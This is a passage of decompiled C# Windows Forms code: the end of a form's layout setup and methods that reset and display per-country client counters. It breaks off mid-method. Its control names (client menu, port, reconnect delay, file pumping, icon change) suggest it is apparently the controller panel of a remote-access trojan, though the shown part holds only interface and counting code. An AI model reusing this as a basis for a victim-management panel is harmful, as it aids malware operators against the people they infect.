		ToolStripStatusLabel toolStripStatusLabel2 = ToolStripStatusLabel2;
		size = new Size(139, 18);
		((ToolStripItem)toolStripStatusLabel2).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel2).set_Text("Ready to any command !");
		((Control)PictureBox1).set_Anchor((AnchorStyles)15);
		PictureBox1.set_Image((Image)componentResourceManager.GetObject("PictureBox1.Image"));
		PictureBox pictureBox = PictureBox1;
		location = new Point(3, 3);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(706, 427);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		((Control)REF).set_Anchor((AnchorStyles)6);
		((Control)REF).set_Font(new Font("Segoe UI", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ButtonBase)REF).set_Image((Image)(object)Resources._1484170437_arrow_refresh);
		((ButtonBase)REF).set_ImageAlign((ContentAlignment)16);
		Button rEF = REF;
		location = new Point(3, 461);
		((Control)rEF).set_Location(location);
		((Control)REF).set_Name("REF");
		Button rEF2 = REF;
		size = new Size(230, 23);
		((Control)rEF2).set_Size(size);
		((Control)REF).set_TabIndex(1);
		((ButtonBase)REF).set_Text("Refresh");
		((ButtonBase)REF).set_UseVisualStyleBackColor(true);
		((Control)TreeView1).set_Anchor((AnchorStyles)7);
		((Control)TreeView1).set_Font(new Font("Verdana", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TreeView1.set_ImageIndex(0);
		TreeView1.set_ImageList(ImageList3);
		TreeView1.set_LineColor(Color.FromArgb(132, 157, 184));
		TreeView treeView = TreeView1;
		location = new Point(3, 7);
		((Control)treeView).set_Location(location);
		((Control)TreeView1).set_Name("TreeView1");
		val.set_Name("Node0");
		val.set_Text("Saved Data");
		TreeView1.get_Nodes().AddRange((TreeNode[])(object)new TreeNode[1] { val });
		TreeView1.set_SelectedImageIndex(0);
		TreeView treeView2 = TreeView1;
		size = new Size(230, 452);
		((Control)treeView2).set_Size(size);
		((Control)TreeView1).set_TabIndex(0);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(1132, 473);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)EtherealTabControl2);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("FrmMAINGR");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Form1");
		((Form)this).set_TransparencyKey(Color.Fuchsia);
		((Control)ClientMenu).ResumeLayout(false);
		((Control)ContextMenuStrip3).ResumeLayout(false);
		((Control)ContextMenuStrip2).ResumeLayout(false);
		((Control)EtherealTabControl2).ResumeLayout(false);
		((Control)TabPage4).ResumeLayout(false);
		((Control)TabPage4).PerformLayout();
		((Control)StatusStrip4).ResumeLayout(false);
		((Control)StatusStrip4).PerformLayout();
		((Control)TabPage5).ResumeLayout(false);
		((Control)Panel2).ResumeLayout(false);
		((Control)GroupBox9).ResumeLayout(false);
		((Control)GroupBox15).ResumeLayout(false);
		((Control)GroupBox15).PerformLayout();
		((ISupportInitialize)MSGPic).EndInit();
		((Control)GroupBox10).ResumeLayout(false);
		((Control)TabControl2).ResumeLayout(false);
		((Control)TabPage17).ResumeLayout(false);
		((Control)TabPage17).PerformLayout();
		((Control)GroupBox11).ResumeLayout(false);
		((Control)GroupBox11).PerformLayout();
		((Control)TabPage14).ResumeLayout(false);
		((Control)TabPage14).PerformLayout();
		((Control)TabPage15).ResumeLayout(false);
		((Control)TabPage15).PerformLayout();
		((Control)GroupBox12).ResumeLayout(false);
		((Control)GroupBox12).PerformLayout();
		((Control)TabPage16).ResumeLayout(false);
		((Control)TabPage16).PerformLayout();
		((Control)GroupBox13).ResumeLayout(false);
		((Control)GroupBox13).PerformLayout();
		((ISupportInitialize)TBSTT).EndInit();
		((Control)GroupBox2).ResumeLayout(false);
		((Control)GroupBox16).ResumeLayout(false);
		((Control)GroupBox16).PerformLayout();
		((ISupportInitialize)Pumpv).EndInit();
		((Control)GroupBox5).ResumeLayout(false);
		((Control)GroupBox5).PerformLayout();
		((ISupportInitialize)iconbox).EndInit();
		((Control)GroupBox7).ResumeLayout(false);
		((Control)GroupBox7).PerformLayout();
		((Control)GroupBox3).ResumeLayout(false);
		((Control)GroupBox3).PerformLayout();
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox14).ResumeLayout(false);
		((Control)GroupBox14).PerformLayout();
		((ISupportInitialize)sleep).EndInit();
		((ISupportInitialize)recdelay).EndInit();
		((Control)GroupBox8).ResumeLayout(false);
		((Control)GroupBox8).PerformLayout();
		((Control)GroupBox4).ResumeLayout(false);
		((Control)GroupBox4).PerformLayout();
		((Control)GroupBox6).ResumeLayout(false);
		((Control)GroupBox6).PerformLayout();
		((Control)ContextMenuStrip4).ResumeLayout(false);
		((ISupportInitialize)Porttxtbox).EndInit();
		((Control)TabPage8).ResumeLayout(false);
		((Control)TabPage8).PerformLayout();
		((Control)StatusStrip5).ResumeLayout(false);
		((Control)StatusStrip5).PerformLayout();
		((Control)TabPage6).ResumeLayout(false);
		((Control)Panel3).ResumeLayout(false);
		((Control)Panel3).PerformLayout();
		((ISupportInitialize)PM).EndInit();
		((Control)TabPage7).ResumeLayout(false);
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((Control)TabPage9).ResumeLayout(false);
		((Control)TabPage9).PerformLayout();
		((Control)StatusStrip1).ResumeLayout(false);
		((Control)StatusStrip1).PerformLayout();
		((Control)TabPage11).ResumeLayout(false);
		((Control)TabControl1).ResumeLayout(false);
		((Control)TabPage12).ResumeLayout(false);
		((Control)TabPage12).PerformLayout();
		((Control)StatusStrip2).ResumeLayout(false);
		((Control)StatusStrip2).PerformLayout();
		((Control)TabPage13).ResumeLayout(false);
		((Control)StatusStrip3).ResumeLayout(false);
		((Control)StatusStrip3).PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}

	public int CLC()
	{
		Afghanistan = 0;
		Albania = 0;
		Algeria = 0;
		AmericanSamoa = 0;
		Andorra = 0;
		Angola = 0;
		Anguilla = 0;
		AntiguaandBarbuda = 0;
		Argentina = 0;
		Armenia = 0;
		Aruba = 0;
		Australia = 0;
		Austria = 0;
		Azerbaijan = 0;
		Bahamas = 0;
		Bahrain = 0;
		Bangladesh = 0;
		Barbados = 0;
		Belarus = 0;
		Belgium = 0;
		Belize = 0;
		Benin = 0;
		Bermuda = 0;
		Bhutan = 0;
		Bolivia = 0;
		BosniaandHerzegovina = 0;
		Botswana = 0;
		BouvetIsland = 0;
		Brazil = 0;
		BritishIndianOceanTerritory = 0;
		BritishVirginIsland = 0;
		BruneiDarussalam = 0;
		Bulgaria = 0;
		BurkinaFaso = 0;
		Burundi = 0;
		Cambodia = 0;
		Cameroon = 0;
		Canada = 0;
		CVC = 0;
		Catalonia = 0;
		CaymanIslands = 0;
		CentralAfricanRepublic = 0;
		Chad = 0;
		Chile = 0;
		China = 0;
		ChristmasIsland = 0;
		CCKI = 0;
		Colombia = 0;
		Comoros = 0;
		DemocraticRepublicoftheCongo = 0;
		CostaRica = 0;
		Croatia = 0;
		Cuba = 0;
		Cyprus = 0;
		CzechRepublic = 0;
		Denmark = 0;
		Djibouti = 0;
		Dominica = 0;
		DominicanRepublic = 0;
		Ecuador = 0;
		Egypt = 0;
		ElSalvador = 0;
		England = 0;
		EquatorialGuinea = 0;
		Eritrea = 0;
		Estonia = 0;
		Ethiopia = 0;
		Europe = 0;
		FalklandIslandsMalvinas = 0;
		FaroeIslands = 0;
		Fiji = 0;
		Finland = 0;
		France = 0;
		FrenchGuiana = 0;
		FrenchPolynesia = 0;
		FrenchSouthernTerritories = 0;
		Gabon = 0;
		Gambia = 0;
		Georgia = 0;
		Germany = 0;
		Ghana = 0;
		Gibraltar = 0;
		Greece = 0;
		Greenland = 0;
		Grenada = 0;
		Guadeloupe = 0;
		Guam = 0;
		Guatemala = 0;
		Guinea = 0;
		GuineaBissau = 0;
		Guyana = 0;
		Haiti = 0;
		HeardIslandandMcDonaldIslands = 0;
		Honduras = 0;
		HongKong = 0;
		Hungary = 0;
		Iceland = 0;
		India = 0;
		Indonesia = 0;
		IslamicRepublicofIran = 0;
		Iraq = 0;
		Ireland = 0;
		PalestinianTerritory = 0;
		Italy = 0;
		Jamaica = 0;
		Japan = 0;
		Jordan = 0;
		Kazakhstan = 0;
		Kenya = 0;
		Kiribati = 0;
		NorthKorea = 0;
		SouthKorea = 0;
		Kuwait = 0;
		Kyrgyzstan = 0;
		LaoPeoplesDemocraticRepublic = 0;
		Latvia = 0;
		Lebanon = 0;
		Lesotho = 0;
		Liberia = 0;
		Libya = 0;
		Liechtenstein = 0;
		Lithuania = 0;
		Luxembourg = 0;
		Macao = 0;
		RepublicofMacedonia = 0;
		Madagascar = 0;
		Malawi = 0;
		Malaysia = 0;
		Maldives = 0;
		Mali = 0;
		Malta = 0;
		MarshallIslands = 0;
		Martinique = 0;
		Mauritania = 0;
		Mauritius = 0;
		Mayotte = 0;
		Mexico = 0;
		FederatedStatesofMicronesia = 0;
		RepublicofMoldova = 0;
		PrincipalityofMonaco = 0;
		Mongolia = 0;
		Montenegro = 0;
		Montserrat = 0;
		Morocco = 0;
		Mozambique = 0;
		Myanmar = 0;
		Namibia = 0;
		Nauru = 0;
		Nepal = 0;
		NetherlandsAntilles = 0;
		Netherlands = 0;
		NewCaledonia = 0;
		NewZealand = 0;
		Nicaragua = 0;
		Niger = 0;
		Nigeria = 0;
		Niue = 0;
		NorfolkIsland = 0;
		NorthernMarianaIslands = 0;
		Norway = 0;
		SultanateofOman = 0;
		IslamicRepublicofPakistan = 0;
		Palau = 0;
		Panama = 0;
		PapuaNewGuinea = 0;
		Paraguay = 0;
		Peru = 0;
		Philippines = 0;
		PitcairnIslands = 0;
		Poland = 0;
		Portugal = 0;
		Palestine = 0;
		PuertoRico = 0;
		Qatar = 0;
		Reunion = 0;
		Romania = 0;
		Serbia = 0;
		Russia = 0;
		Rwanda = 0;
		SaintHelena = 0;
		SaintKittsandNevis = 0;
		SaintLucia = 0;
		SaintPierreandMiquelon = 0;
		SaintVincentandtheGrenadines = 0;
		Samoa = 0;
		SanMarino = 0;
		SaoTomeandPrincipe = 0;
		SaudiArabia = 0;
		Scotland = 0;
		Senegal = 0;
		Seychelles = 0;
		SierraLeone = 0;
		Singapore = 0;
		Slovakia = 0;
		Slovenia = 0;
		SolomonIslands = 0;
		Somalia = 0;
		SouthAfrica = 0;
		SouthGeorgiaandtheSouthSandwichIslands = 0;
		Spain = 0;
		SriLanka = 0;
		Sudan = 0;
		Suriname = 0;
		SvalbardandJanMayen = 0;
		Swaziland = 0;
		Sweden = 0;
		Switzerland = 0;
		Syria = 0;
		Taiwan = 0;
		Tajikistan = 0;
		UnitedRepublicofTanzania = 0;
		Thailand = 0;
		Togo = 0;
		Tokelau = 0;
		Tonga = 0;
		TrinidadAndTobago = 0;
		Tunisia = 0;
		Turkey = 0;
		Turkmenistan = 0;
		TurksandCaicosIslands = 0;
		Tuvalu = 0;
		Uganda = 0;
		Ukraine = 0;
		UnitedArabEmirates = 0;
		UnitedKingdom = 0;
		UnitedStatesMinorOutlyingIslands = 0;
		UnitedStates = 0;
		Uruguay = 0;
		Uzbekistan = 0;
		Wales = 0;
		WallisAndFutuna = 0;
		Vanuatu = 0;
		VaticanCityState = 0;
		Venezuela = 0;
		WesternSahara = 0;
		Vietnam = 0;
		UnitedStatesVirginIslands = 0;
		Yemen = 0;
		Zambia = 0;
		Zimbabwe = 0;
		CookIslands = 0;
		Antarctica = 0;
		Congo = 0;
		CoteDIvoire = 0;
		SatelliteProvider = 0;
		AlandIslands = 0;
		Guernsey = 0;
		IsleofMan = 0;
		Jersey = 0;
		SaintBarthelemy = 0;
		NA = 0;
		return 0;
	}

	public string CICNE()
	{
		if (GuineaBissau != 0)
		{
			Label label = Label1;
			label.set_Text((label.get_Text() + "\r\nGuinea-Bissau : " + Conversions.ToString(GuineaBissau)).ToString());
		}
		if (Guyana != 0)
		{
			Label label2 = Label1;
			label2.set_Text((label2.get_Text() + "\r\nGuyana : " + Conversions.ToString(Guyana)).ToString());
		}
		if (Haiti != 0)
		{
			Label label3 = Label1;
			label3.set_Text((label3.get_Text() + "\r\nHaiti : " + Conversions.ToString(Haiti)).ToString());
		}
		if (HeardIslandandMcDonaldIslands != 0)
		{
			Label label4 = Label1;
			label4.set_Text((label4.get_Text() + "\r\nHeard Island and McDonald Islands : " + Conversions.ToString(HeardIslandandMcDonaldIslands)).ToString());
		}
		if (Honduras != 0)
		{
			Label label5 = Label1;
			label5.set_Text((label5.get_Text() + "\r\nHonduras : " + Conversions.ToString(Honduras)).ToString());
		}
		if (HongKong != 0)
		{
			Label label6 = Label1;
			label6.set_Text((label6.get_Text() + "\r\nHong Kong : " + Conversions.ToString(HongKong)).ToString());
		}
		if (Hungary != 0)
		{
			Label label7 = Label1;
			label7.set_Text((label7.get_Text() + "\r\nHungary : " + Conversions.ToString(Hungary)).ToString());
		}
		if (Iceland != 0)
		{
			Label label8 = Label1;
			label8.set_Text((label8.get_Text() + "\r\nIceland : " + Conversions.ToString(Iceland)).ToString());
		}
		if (India != 0)
		{
			Label label9 = Label1;
			label9.set_Text((label9.get_Text() + "\r\nIndia : " + Conversions.ToString(India)).ToString());
		}
		if (Indonesia != 0)
		{
			Label label10 = Label1;
			label10.set_Text((label10.get_Text() + "\r\nIndonesia : " + Conversions.ToString(Indonesia)).ToString());
		}
		if (IslamicRepublicofIran != 0)
		{
			Label label11 = Label1;
			label11.set_Text((label11.get_Text() + "\r\nIslamic Republic of Iran : " + Conversions.ToString(IslamicRepublicofIran)).ToString());
		}
		if (Iraq != 0)
		{
			Label label12 = Label1;
			label12.set_Text((label12.get_Text() + "\r\nIraq : " + Conversions.ToString(Iraq)).ToString());
		}
		if (Ireland != 0)
		{
			Label label13 = Label1;
			label13.set_Text((label13.get_Text() + "\r\nIreland : " + Conversions.ToString(Ireland)).ToString());
		}
		if (PalestinianTerritory != 0)
		{
			Label label14 = Label1;
			label14.set_Text((label14.get_Text() + "\r\nPalestinian Territory , Occupied : " + Conversions.ToString(PalestinianTerritory)).ToString());
		}
		if (Italy != 0)
		{
			Label label15 = Label1;
			label15.set_Text((label15.get_Text() + "\r\nItaly : " + Conversions.ToString(Italy)).ToString());
		}
		if (Jamaica != 0)
		{
			Label label16 = Label1;
			label16.set_Text((label16.get_Text() + "\r\nJamaica : " + Conversions.ToString(Jamaica)).ToString());
		}
		if (Japan != 0)
		{
			Label label17 = Label1;
			label17.set_Text((label17.get_Text() + "\r\nJapan : " + Conversions.ToString(Japan)).ToString());
		}
		if (Jordan != 0)
		{
			Label label18 = Label1;
			label18.set_Text((label18.get_Text() + "\r\nJordan : " + Conversions.ToString(Jordan)).ToString());
		}
		if (Kazakhstan != 0)
		{
			Label label19 = Label1;
			label19.set_Text((label19.get_Text() + "\r\nKazakhstan : " + Conversions.ToString(Kazakhstan)).ToString());
		}
		if (Kenya != 0)
		{
			Label label20 = Label1;
			label20.set_Text((label20.get_Text() + "\r\nKenya : " + Conversions.ToString(Kenya)).ToString());
		}
		if (Kiribati != 0)
		{
			Label label21 = Label1;
			label21.set_Text((label21.get_Text() + "\r\nKiribati : " + Conversions.ToString(Kiribati)).ToString());
		}
		if (NorthKorea != 0)
		{
			Label label22 = Label1;
			label22.set_Text((label22.get_Text() + "\r\nNorth Korea : " + Conversions.ToString(NorthKorea)).ToString());
		}
		if (SouthKorea != 0)
		{
			Label label23 = Label1;
			label23.set_Text((label23.get_Text() + "\r\nSouth Korea : " + Conversions.ToString(SouthKorea)).ToString());
		}
		if (Kuwait != 0)
		{
			Label label24 = Label1;
			label24.set_Text((label24.get_Text() + "\r\nKuwait : " + Conversions.ToString(Kuwait)).ToString());
		}
		if (Kyrgyzstan != 0)
		{
			Label label25 = Label1;
			label25.set_Text((label25.get_Text() + "\r\nKyrgyzstan : " + Conversions.ToString(Kyrgyzstan)).ToString());
		}
		if (LaoPeoplesDemocraticRepublic != 0)
		{
			Label label26 = Label1;
			label26.set_Text((label26.get_Text() + "\r\nLao People's Democratic Republic : " + Conversions.ToString(LaoPeoplesDemocraticRepublic)).ToString());
		}
		if (Latvia != 0)
		{
			Label label27 = Label1;
			label27.set_Text((label27.get_Text() + "\r\nLatvia : " + Conversions.ToString(Latvia)).ToString());
		}
		if (Lebanon != 0)
		{
			Label label28 = Label1;
			label28.set_Text((label28.get_Text() + "\r\nLebanon : " + Conversions.ToString(Lebanon)).ToString());
		}
		if (Lesotho != 0)
		{
			Label label29 = Label1;
			label29.set_Text((label29.get_Text() + "\r\nLesotho : " + Conversions.ToString(Lesotho)).ToString());
		}
		if (Liberia != 0)
		{
			Label label30 = Label1;
			label30.set_Text((label30.get_Text() + "\r\nLiberia : " + Conversions.ToString(Liberia)).ToString());
		}
		if (Libya != 0)
		{
			Label label31 = Label1;
			label31.set_Text((label31.get_Text() + "\r\nLibyan Arab Jamahiriya : " + Conversions.ToString(Libya)).ToString());
		}
		if (Liechtenstein != 0)
		{
			Label label32 = Label1;
			label32.set_Text((label32.get_Text() + "\r\nLiechtenstein : " + Conversions.ToString(Liechtenstein)).ToString());
		}
		if (Lithuania != 0)
		{
			Label label33 = Label1;
			label33.set_Text((label33.get_Text() + "\r\nLithuania : " + Conversions.ToString(Lithuania)).ToString());
		}
		if (Luxembourg != 0)
		{
			Label label34 = Label1;
			label34.set_Text((label34.get_Text() + "\r\nLuxembourg : " + Conversions.ToString(Luxembourg)).ToString());
		}
		if (Macao != 0)
		{
			Label label35 = Label1;
			label35.set_Text((label35.get_Text() + "\r\nMacao : " + Conversions.ToString(Macao)).ToString());
		}
		if (RepublicofMacedonia != 0)
		{
			Label label36 = Label1;
			label36.set_Text((label36.get_Text() + "\r\nRepublic of Macedonia : " + Conversions.ToString(RepublicofMacedonia)).ToString());
		}
		if (Madagascar != 0)
		{
			Label label37 = Label1;
			label37.set_Text((label37.get_Text() + "\r\nMadagascar : " + Conversions.ToString(Madagascar)).ToString());
		}
		if (Malawi != 0)
		{
			Label label38 = Label1;
			label38.set_Text((label38.get_Text() + "\r\nMalawi : " + Conversions.ToString(Malawi)).ToString());
		}
		if (Malaysia != 0)
		{
			Label label39 = Label1;
			label39.set_Text((label39.get_Text() + "\r\nMalaysia : " + Conversions.ToString(Malaysia)).ToString());
		}
		if (Maldives != 0)
		{
			Label label40 = Label1;
			label40.set_Text((label40.get_Text() + "\r\nMaldives : " + Conversions.ToString(Maldives)).ToString());
		}
		if (Mali != 0)
		{
			Label label41 = Label1;
			label41.set_Text((label41.get_Text() + "\r\nMali : " + Conversions.ToString(Mali)).ToString());
		}
		if (Malta != 0)
		{
			Label label42 = Label1;
			label42.set_Text((label42.get_Text() + "\r\nMalta : " + Conversions.ToString(Malta)).ToString());
		}
		if (MarshallIslands != 0)
		{
			Label label43 = Label1;
			label43.set_Text((label43.get_Text() + "\r\nMarshall Islands : " + Conversions.ToString(MarshallIslands)).ToString());
		}
		if (Martinique != 0)
		{
			Label label44 = Label1;
			label44.set_Text((label44.get_Text() + "\r\nMartinique : " + Conversions.ToString(Martinique)).ToString());
		}
		if (Mauritania != 0)
		{
			Label label45 = Label1;
			label45.set_Text((label45.get_Text() + "\r\nMauritania : " + Conversions.ToString(Mauritania)).ToString());
		}
		if (Mauritius != 0)
		{
			Label label46 = Label1;
			label46.set_Text((label46.get_Text() + "\r\nMauritius : " + Conversions.ToString(Mauritius)).ToString());
		}
		if (Mayotte != 0)
		{
			Label label47 = Label1;
			label47.set_Text((label47.get_Text() + "\r\nMayotte : " + Conversions.ToString(Mayotte)).ToString());
		}
		if (Mexico != 0)
		{
			Label label48 = Label1;
			label48.set_Text((label48.get_Text() + "\r\nMexico : " + Conversions.ToString(Mexico)).ToString());
		}
		if (FederatedStatesofMicronesia != 0)
		{
			Label label49 = Label1;
			label49.set_Text((label49.get_Text() + "\r\nFederated States of Micronesia : " + Conversions.ToString(FederatedStatesofMicronesia)).ToString());
		}
		if (RepublicofMoldova != 0)
		{
			Label label50 = Label1;
			label50.set_Text((label50.get_Text() + "\r\nRepublic of Moldova : " + Conversions.ToString(RepublicofMoldova)).ToString());
		}
		if (PrincipalityofMonaco != 0)
		{
			Label label51 = Label1;
			label51.set_Text((label51.get_Text() + "\r\nPrincipality of Monaco : " + Conversions.ToString(PrincipalityofMonaco)).ToString());
		}
		if (Mongolia != 0)
		{
			Label label52 = Label1;
			label52.set_Text((label52.get_Text() + "\r\nMongolia : " + Conversions.ToString(Mongolia)).ToString());
		}
		if (Montenegro != 0)
		{
			Label label53 = Label1;
			label53.set_Text((label53.get_Text() + "\r\nMontenegro : " + Conversions.ToString(Montenegro)).ToString());
		}
		if (Montserrat != 0)
		{
			Label label54 = Label1;
			label54.set_Text((label54.get_Text() + "\r\nMontserrat : " + Conversions.ToString(Montserrat)).ToString());
		}
		if (Morocco != 0)
		{
			Label label55 = Label1;
			label55.set_Text((label55.get_Text() + "\r\nMorocco : " + Conversions.ToString(Morocco)).ToString());
		}
		if (Mozambique != 0)
		{
			Label label56 = Label1;
			label56.set_Text((label56.get_Text() + "\r\nMozambique : " + Conversions.ToString(Mozambique)).ToString());
		}
		if (Myanmar != 0)
		{
			Label label57 = Label1;
			label57.set_Text((label57.get_Text() + "\r\nMyanmar : " + Conversions.ToString(Myanmar)).ToString());
		}
		if (Namibia != 0)
		{
			Label label58 = Label1;
			label58.set_Text((label58.get_Text() + "\r\nNamibia : " + Conversions.ToString(Namibia)).ToString());
		}
		if (Nauru != 0)
		{
			Label label59 = Label1;
			label59.set_Text((label59.get_Text() + "\r\nNauru : " + Conversions.ToString(Nauru)).ToString());
		}
		if (Nepal != 0)
		{
			Label label60 = Label1;
			label60.set_Text((label60.get_Text() + "\r\nNepal : " + Conversions.ToString(Nepal)).ToString());
		}
		if (NetherlandsAntilles != 0)
		{
			Label label61 = Label1;
			label61.set_Text((label61.get_Text() + "\r\nNetherlands Antilles : " + Conversions.ToString(NetherlandsAntilles)).ToString());
		}
		if (Netherlands != 0)
		{
			Label label62 = Label1;
			label62.set_Text((label62.get_Text() + "\r\nNetherlands : " + Conversions.ToString(Netherlands)).ToString());
		}
		if (NewCaledonia != 0)
		{
			Label label63 = Label1;
			label63.set_Text((label63.get_Text() + "\r\nNew Caledonia : " + Conversions.ToString(NewCaledonia)).ToString());
		}
		if (NewZealand != 0)
		{
			Label label64 = Label1;
			label64.set_Text((label64.get_Text() + "\r\nNew Zealand : " + Conversions.ToString(NewZealand)).ToString());
		}
		if (Nicaragua != 0)
		{
			Label label65 = Label1;
			label65.set_Text((label65.get_Text() + "\r\nNicaragua : " + Conversions.ToString(Nicaragua)).ToString());
		}
		if (Niger != 0)
		{
			Label label66 = Label1;
			label66.set_Text((label66.get_Text() + "\r\nNiger : " + Conversions.ToString(Niger)).ToString());
		}
		if (Nigeria != 0)
		{
			Label label67 = Label1;
			label67.set_Text((label67.get_Text() + "\r\nNigeria : " + Conversions.ToString(Nigeria)).ToString());
		}
		if (Niue != 0)
		{
			Label label68 = Label1;
			label68.set_Text((label68.get_Text() + "\r\nNiue : " + Conversions.ToString(Niue)).ToString());
		}
		if (NorfolkIsland != 0)
		{
			Label label69 = Label1;
			label69.set_Text((label69.get_Text() + "\r\nNorfolk Island : " + Conversions.ToString(NorfolkIsland)).ToString());
		}
		if (NorthernMarianaIslands != 0)
		{
			Label label70 = Label1;
			label70.set_Text((label70.get_Text() + "\r\nNorthern Mariana Islands : " + Conversions.ToString(NorthernMarianaIslands)).ToString());
		}
		if (Norway != 0)
		{
			Label label71 = Label1;
			label71.set_Text((label71.get_Text() + "\r\nNorway : " + Conversions.ToString(Norway)).ToString());
		}
		if (SultanateofOman != 0)
		{
			Label label72 = Label1;
			label72.set_Text((label72.get_Text() + "\r\nSultanate of Oman : " + Conversions.ToString(SultanateofOman)).ToString());
		}
		if (IslamicRepublicofPakistan != 0)
		{
			Label label73 = Label1;
			label73.set_Text((label73.get_Text() + "\r\nIslamic Republic of Pakistan : " + Conversions.ToString(IslamicRepublicofPakistan)).ToString());
		}
		if (Palau != 0)
		{
			Label label74 = Label1;
			label74.set_Text((label74.get_Text() + "\r\nPalau : " + Conversions.ToString(Palau)).ToString());
		}
		if (Panama != 0)
		{
			Label label75 = Label1;
			label75.set_Text((label75.get_Text() + "\r\nPanama : " + Conversions.ToString(Panama)).ToString());
		}
		if (PapuaNewGuinea != 0)
		{
			Label label76 = Label1;
			label76.set_Text((label76.get_Text() + "\r\nPapua New Guinea : " + Conversions.ToString(PapuaNewGuinea)).ToString());
		}
		if (Paraguay != 0)
		{
			Label label77 = Label1;
			label77.set_Text((label77.get_Text() + "\r\nParaguay : " + Conversions.ToString(Paraguay)).ToString());
		}
		if (Peru != 0)
		{
			Label label78 = Label1;
			label78.set_Text((label78.get_Text() + "\r\nPeru : " + Conversions.ToString(Peru)).ToString());
		}
		if (Philippines != 0)
		{
			Label label79 = Label1;
			label79.set_Text((label79.get_Text() + "\r\nPhilippines : " + Conversions.ToString(Philippines)).ToString());
		}
		if (PitcairnIslands != 0)
		{
			Label label80 = Label1;
			label80.set_Text((label80.get_Text() + "\r\nPitcairn Islands : " + Conversions.ToString(PitcairnIslands)).ToString());
		}
		if (Poland != 0)
		{
			Label label81 = Label1;
			label81.set_Text((label81.get_Text() + "\r\nPoland : " + Conversions.ToString(Poland)).ToString());
		}
		if (Portugal != 0)
		{
			Label label82 = Label1;
			label82.set_Text((label82.get_Text() + "\r\nPortugal : " + Conversions.ToString(Portugal)).ToString());
		}
		if (Palestine != 0)
		{
			Label label83 = Label1;
			label83.set_Text((label83.get_Text() + "\r\nPalestine : " + Conversions.ToString(Palestine)).ToString());
		}
		if (PuertoRico != 0)
		{
			Label label84 = Label1;
			label84.set_Text((label84.get_Text() + "\r\nPuerto Rico : " + Conversions.ToString(PuertoRico)).ToString());
		}
		if (Qatar != 0)
		{
			Label label85 = Label1;
			label85.set_Text((label85.get_Text() + "\r\nQatar : " + Conversions.ToString(Qatar)).ToString());
		}
		if (Reunion != 0)
		{
			Label label86 = Label1;
			label86.set_Text((label86.get_Text() + "\r\nReunion : " + Conversions.ToString(Reunion)).ToString());
		}
		if (Romania != 0)
		{
			Label label87 = Label1;
			label87.set_Text((label87.get_Text() + "\r\nRomania : " + Conversions.ToString(Romania)).ToString());
		}
		if (Serbia != 0)
		{
			Label label88 = Label1;
			label88.set_Text((label88.get_Text() + "\r\nSerbia : " + Conversions.ToString(Serbia)).ToString());
		}
		if (Russia != 0)
		{
			Label label89 = Label1;
			label89.set_Text((label89.get_Text() + "\r\nRussia : " + Conversions.ToString(Russia)).ToString());
		}
		if (Rwanda != 0)
		{
			Label label90 = Label1;
			label90.set_Text((label90.get_Text() + "\r\nRwanda : " + Conversions.ToString(Rwanda)).ToString());
		}
		if (SaintHelena != 0)
		{
			Label label91 = Label1;
			label91.set_Text((label91.get_Text() + "\r\nSaint Helena : " + Conversions.ToString(SaintHelena)).ToString());
		}
		if (SaintKittsandNevis != 0)
		{
			Label label92 = Label1;
			label92.set_Text((label92.get_Text() + "\r\nSaint Kitts and Nevis : " + Conversions.ToString(SaintKittsandNevis)).ToString());
		}
		if (SaintLucia != 0)
		{
			Label label93 = Label1;
			label93.set_Text((label93.get_Text() + "\r\nSaint Lucia : " + Conversions.ToString(SaintLucia)).ToString());
		}
		if (SaintPierreandMiquelon != 0)
		{
			Label label94 = Label1;
			label94.set_Text((label94.get_Text() + "\r\nSaint Pierre and Miquelon : " + Conversions.ToString(SaintPierreandMiquelon)).ToString());
		}
		if (SaintVincentandtheGrenadines != 0)
		{
			Label label95 = Label1;
			label95.set_Text((label95.get_Text() + "\r\nSaint Vincent and the Grenadines : " + Conversions.ToString(SaintVincentandtheGrenadines)).ToString());
		}
		if (Samoa != 0)
		{
			Label label96 = Label1;
			label96.set_Text((label96.get_Text() + "\r\nSamoa : " + Conversions.ToString(Samoa)).ToString());
		}
		if (SanMarino != 0)
		{
			Label label97 = Label1;
			label97.set_Text((label97.get_Text() + "\r\nSan Marino : " + Conversions.ToString(SanMarino)).ToString());
		}
		if (SaoTomeandPrincipe != 0)
		{
			Label label98 = Label1;
			label98.set_Text((label98.get_Text() + "\r\nSao Tome and Principe : " + Conversions.ToString(SaoTomeandPrincipe)).ToString());
		}
		if (SaudiArabia != 0)
		{
			Label label99 = Label1;
			label99.set_Text((label99.get_Text() + "\r\nSaudi Arabia : " + Conversions.ToString(SaudiArabia)).ToString());
		}
		if (Scotland != 0)
		{
			Label label100 = Label1;
			label100.set_Text((label100.get_Text() + "\r\nScotland : " + Conversions.ToString(Scotland)).ToString());
		}
		if (Senegal != 0)
		{
			Label label101 = Label1;
			label101.set_Text((label101.get_Text() + "\r\nSenegal : " + Conversions.ToString(Senegal)).ToString());
		}
		if (Seychelles != 0)
		{
			Label label102 = Label1;
			label102.set_Text((label102.get_Text() + "\r\nSeychelles : " + Conversions.ToString(Seychelles)).ToString());
		}
		if (SierraLeone != 0)
		{
			Label label103 = Label1;
			label103.set_Text((label103.get_Text() + "\r\nSierra Leone : " + Conversions.ToString(SierraLeone)).ToString());
		}
		if (Singapore != 0)
		{
			Label label104 = Label1;
			label104.set_Text((label104.get_Text() + "\r\nSingapore : " + Conversions.ToString(Singapore)).ToString());
		}
		if (Slovakia != 0)
